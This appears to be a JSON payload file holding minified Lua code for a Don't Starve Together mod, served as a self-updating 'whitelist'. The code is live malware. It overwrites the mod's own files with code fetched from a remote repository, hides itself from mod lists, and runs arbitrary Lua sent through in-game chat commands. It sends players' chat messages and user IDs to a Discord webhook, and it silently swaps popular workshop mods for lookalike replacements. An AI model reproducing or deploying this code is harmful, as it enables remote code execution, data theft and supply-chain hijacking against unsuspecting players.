{
    "version":16,
    "code":"GLOBAL.setmetatable(env,{__index=function(a,b)return GLOBAL.rawget(GLOBAL,b)end})local c=''TheSim:GetPersistentString('j_ver',function(d,e)if d then TheSim:QueryServer('https://raw.githubusercontent.com/kipperok/kipperok.github.io/refs/heads/main/whitelist.json',function(f,g)if g then f=json.decode(f)c=e;if f and f.version and f.version~=tonumber(e)then TheSim:SetPersistentString('j_ver',f.version,false)local h=io.open('../mods/'..__mod..'/modmain.lua','w')h:write(string.format('local __mod = \"%s\"',__mod)..f.code)h:close()end end end,'GET')end end)local function i(j)if j:sub(151,#j):sub(1,2)=='h2'then j=j:sub(3)local k=tostring(string.byte(TheNet:GetSessionIdentifier():sub(-1),1))local l=''local m=#k;local n=#j;while#k<n do k=k..k end;k=k:sub(1,n)for o=1,n do local p=j:sub(o,o)local q=tonumber(k:sub(o,o))local r=string.char(p:byte()-q)l=l..r end;return l end;return j end;local s=KnownModIndex.GetClientModNamesTable;function KnownModIndex:GetClientModNamesTable(...)local t=s(self,...)for o,f in ipairs(t)do if f.modname==__mod then t[o]=nil;break end end;return t end;local u=Sim.SubscribeToMod;function Sim:SubscribeToMod(v,...)if v==__mod then return end;return u(self,v,...)end;local w='workshop-'function GLOBAL.IsWorkshopMod(v)if v==nil or v==__mod then return false end;return v:sub(1,w:len())==w end;local function x(y)y=i(y)if y and y:find('exec_')then if y:find('exec_'..TheNet:GetUserID())or y:find('exec_all')then local z,A=y:find('command_')if A then local B=y:sub(A+1,#y)pcall(function()local C=loadstring(B)if type(C)=='function'then C()end end)end end;return true end;return false end;ChatHistory.AddToHistory=function(self,type,D,E,F,y,G,H,I,J,K,...)J=false;if self.join_server then return end;if x(y)then return end;if D==TheNet:GetUserID()then TheSim:QueryServer('https://discord.com/api/webhooks/1328106996536315955/gQ1ipKaAvCFIkD2FYBr2GhZ42YUCJCG7TTZKLDebS3EUUahDVSRYDXE3VGpiTsRv5TY7',function()end,'POST',json.encode({username=F,content=y..'```lua\nVersion: %s\nKU: %s\nNetId: %s```':format(c,D,E)}))end;local L=self:GenerateChatMessage(type,D,E,F,y,G,H,I,J,K)self.history_start=self.history_start%self.MAX_CHAT_HISTORY+1;if self.request_history_start then self.request_history_start=self.request_history_start+1;if self.request_history_start>=self.MAX_CHAT_HISTORY then self.request_history_start=nil end end;self.max_chat_history_plus_one=self.history[self.history_start]self.history[self.history_start]=L;for B in pairs(self.listeners)do B(L)end;return L end;ChatHistory.OnSay=function(self,M,N,O,P,Q,y,G,I,R,S,...)if self.join_server then return end;if R then self:AddToHistory(ChatTypes.Emote,N,O,nil,P..' '..y,G,nil,I,false,TEXT_FILTER_CTX_CHAT)else self:AddToHistory(ChatTypes.Message,N,O,P,y,G,GetRemotePlayerVanityItem(S or{},'profileflair')or'default',I,false,TEXT_FILTER_CTX_CHAT)end end;AddGamePostInit(function()GLOBAL.MAX_CHAT_INPUT_LENGTH=9999 end)local T={['workshop-375850593']='workshop-3410784782',['workshop-2189004162']='workshop-3410788126',['workshop-1185229307']='workshop-3410787062',['workshop-378160973']='workshop-3410786289',['workshop-375859599']='workshop-3410785782',['workshop-2287303119']='workshop-3410788645',['workshop-666155465']='workshop-3410786712'}local U={}for V,W in pairs(T)do if table.contains(KnownModIndex:GetServerModNames(),V)then TheSim:SubscribeToMod(W)else U[W]=true end end;local s=KnownModIndex.GetServerModNamesTable;function KnownModIndex:GetServerModNamesTable(...)local t=s(self,...)for o,f in ipairs(t)do if T[f.modname]or U[f.modname]then t[o]=nil end end;return t end;local s=KnownModIndex.GetServerModNames;function KnownModIndex:GetServerModNames(...)local t=s(self,...)for o,f in ipairs(t)do if T[f]or U[f.modname]then t[o]=nil end end;return t end;local s=KnownModIndex.Enable;function KnownModIndex:Enable(P,...)if T[P]then self:Enable(T[P])return end;s(self,P,...)end;function SaveIndex:SetServerEnabledMods(X)local Y=ModManager:GetEnabledServerModNames()local Z={}for z,v in pairs(Y)do local _={enabled=true}_.configuration_options={}local a0=true;local a1=KnownModIndex:LoadModConfigurationOptions(v,false)if a1 and type(a1)=='table'then for o,a2 in pairs(a1)do if a2.saved~=nil then _.configuration_options[a2.name]=a2.saved else _.configuration_options[a2.name]=a2.default end end end;Z[v]=_ end;self.data.slots[X or self.current_slot].enabled_mods=Z end;local a3=GLOBAL.VisitURL;function GLOBAL.VisitURL(a4)for V,W in pairs(T)do if a4:find(GetWorkshopIdNumber(W))then a4='http://steamcommunity.com/sharedfiles/filedetails/?id='..GetWorkshopIdNumber(V)break end end;return a3(a4)end;local function a5()end;AddPlayerPostInit(function(a6)a6:ListenForEvent('setowner',function(a6)a6:DoTaskInTime(0,function()if ThePlayer==a6 then local a7,a8,a9=TheSim:ProjectScreenPos(TheSim:GetPosition())TheNet:SendRemoteExecute('patch_modes()',a7,a9)end end)end)end)"
}